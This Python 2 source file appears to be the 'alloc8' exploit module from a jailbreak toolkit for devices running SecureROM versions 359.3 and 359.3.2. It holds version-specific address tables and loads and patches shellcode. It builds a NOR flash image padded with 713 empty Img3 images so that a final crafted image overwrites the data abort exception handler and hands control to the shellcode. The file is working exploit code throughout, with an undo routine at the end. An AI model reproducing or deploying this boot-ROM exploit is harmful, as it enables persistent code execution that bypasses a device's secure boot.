import copy, struct, sys

alloc8_constants_359_3 = [
    0x84034000, #  1 - MAIN_STACK_ADDRESS
         0x544, #  2 - clean_invalidate_data_cache
    0x84024020, #  3 - gNorImg3List
        0x1ccd, #  4 - free
        0x3ca1, #  5 - exit_critical_section
        0x451d, #  6 - home_button_pressed
        0x450d, #  7 - power_button_pressed
        0x44e1, #  8 - cable_connected
    0x696c6c62, #  9 - ILLB_MAGIC
        0x1f6f, # 10 - get_nor_image
    0x84000000, # 11 - LOAD_ADDRESS
       0x24000, # 12 - MAX_SIZE
        0x3969, # 13 - jump_to
        0x38a1, # 14 - usb_create_serial_number_string
        0x8e7d, # 15 - strlcat
        0x349d, # 16 - usb_wait_for_image
    0x84024228, # 17 - gLeakingDFUBuffer
    0x65786563, # 18 - EXEC_MAGIC
        0x1f79, # 19 - memz_create
        0x1fa1, # 20 - memz_destroy
    0x696d6733, # 21 - IMG3_STRUCT_MAGIC
    0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC
        0x1fe5, # 23 - image3_create_struct
        0x2655, # 24 - image3_load_continue
        0x277b, # 25 - image3_load_fail
]

alloc8_constants_359_3_2 = [
    0x84034000, #  1 - MAIN_STACK_ADDRESS
         0x544, #  2 - clean_invalidate_data_cache
    0x84024020, #  3 - gNorImg3List
        0x1ccd, #  4 - free
        0x3ca9, #  5 - exit_critical_section
        0x4525, #  6 - home_button_pressed
        0x4515, #  7 - power_button_pressed
        0x44e9, #  8 - cable_connected
    0x696c6c62, #  9 - ILLB_MAGIC
        0x1f77, # 10 - get_nor_image
    0x84000000, # 11 - LOAD_ADDRESS
       0x24000, # 12 - MAX_SIZE
        0x3971, # 13 - jump_to
        0x38a9, # 14 - usb_create_serial_number_string
        0x8e85, # 15 - strlcat
        0x34a5, # 16 - usb_wait_for_image
    0x84024228, # 17 - gLeakingDFUBuffer
    0x65786563, # 18 - EXEC_MAGIC
        0x1f81, # 19 - memz_create
        0x1fa9, # 20 - memz_destroy
    0x696d6733, # 21 - IMG3_STRUCT_MAGIC
    0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC
        0x1fed, # 23 - image3_create_struct
        0x265d, # 24 - image3_load_continue
        0x2783, # 25 - image3_load_fail
]

def empty_img3(size):
	assert size >= 20
	return struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\x00' * (size - 20)

def exploit(nor, version):
	if version == '359.3':
	    constants = alloc8_constants_359_3
	    exceptions = [0x5620, 0x5630]
	elif version == '359.3.2':
	    constants = alloc8_constants_359_3_2
	    exceptions = [0x5628, 0x5638]
	else:
	    print 'ERROR: SecureROM version %s is not supported by alloc8.' % version
	    sys.exit(1)

	for c in nor.parts[1]:
		assert c == '\x00'
	assert len(nor.images) < 32

	MAX_SHELLCODE_LENGTH = 460
	with open('bin/alloc8-shellcode.bin', 'rb') as f:
		shellcode = f.read()
	assert len(shellcode) <= MAX_SHELLCODE_LENGTH

	# Shellcode has placeholder values for constants; check they match and replace with constants from config.
	placeholders_offset = len(shellcode) - 4 * len(constants)
	for i in range(len(constants)):
	    offset = placeholders_offset + 4 * i
	    (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
	    assert value == 0xBAD00001 + i

	new_nor = copy.deepcopy(nor)
	new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + '\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))

	while len(new_nor.images) < 713:
	   new_nor.images.append(empty_img3(new_nor.block_size))

	# Image no. 714 must end at the end of the 4096-byte block.
	NOR_READ_SIZE = 4096
	offset = 0
	for image in new_nor.images:
		offset += len(image)
	size = NOR_READ_SIZE - offset % NOR_READ_SIZE
	new_nor.images.append(empty_img3(size))

	# This image is copied to address 0x8. SHELLCODE_ADDRESS overrides the data abort exception handler.
	SHELLCODE_ADDRESS = 0x84026214 + 1
	new_nor.images.append(empty_img3(52)[:40] + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions))

	return new_nor

def remove_exploit(nor):
    assert len(nor.images) >= 700

    new_nor = copy.deepcopy(nor)

    new_images = []
    for image in new_nor.images:
        assert len(image) >= 20
        if image[16:20] != 'zero'[::-1]:
            new_images.append(image)
    assert len(new_images) < 32

    new_nor.images = new_images
    new_nor.parts[1] = '\x00' * 460

    return new_nor
